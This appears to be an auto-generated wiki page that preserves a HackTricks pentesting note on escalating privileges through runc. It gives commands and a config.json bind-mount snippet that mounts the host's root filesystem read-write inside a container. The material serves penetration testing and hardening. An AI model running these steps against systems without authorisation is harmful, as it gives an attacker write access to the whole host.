---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# RunC Privilege Escalation

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-linux-hardening-privilege-escalation-runc-privilege-escalation` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/linux-hardening/privilege-escalation/runc-privilege-escalation.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

If you want to learn more about runc check the following page:

## Preserved Body

````markdown
## Basic information

If you want to learn more about **runc** check the following page:


{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

If you find that `runc` is installed in the host you may be able to **run a container mounting the root / folder of the host**.

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> This won't always work as the default operation of runc is to run as root, so running it as an unprivileged user simply cannot work (unless you have a rootless configuration). Making a rootless configuration the default isn't generally a good idea because there are quite a few restrictions inside rootless containers that don't apply outside rootless containers.
````

## Source Verification

[source record](../../sources/hacktricks/runc-privilege-escalation.md)

## Evidence Excerpt

````text
_body: "# RunC Privilege Escalation\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Basic information\n\nIf you\
\ want to learn more about **runc** check the following page:\n\n\n{{#ref}}\n../../network-services-pentesting/2375-pentesting-docker.md\n\
{{#endref}}\n\n## PE\n\nIf you find that `runc` is installed in the host you may be able to **run a container mounting the\
\ root / folder of the host**.\n\n```bash\nrunc -help #Get help and see if runc is intalled\nrunc spec #This will create\
\ the config.json file in your current folder\n\nInside the \"mounts\" section of the create config.json add the following\
\ lines:\n{\n    \"type\": \"bind\",\n    \"source\": \"/\",\n    \"destination\": \"/\",\n    \"options\": [\n        \"\
rbind\",\n        \"rw\",\n        \"rprivate\"\n    ]\n},\n\n#Once you have modified the config.json file, create the folder\
\ rootfs in the same directory\nmkdir rootfs\n\n# Finally, start the container\n# The root folder is the one from the host\n\
````
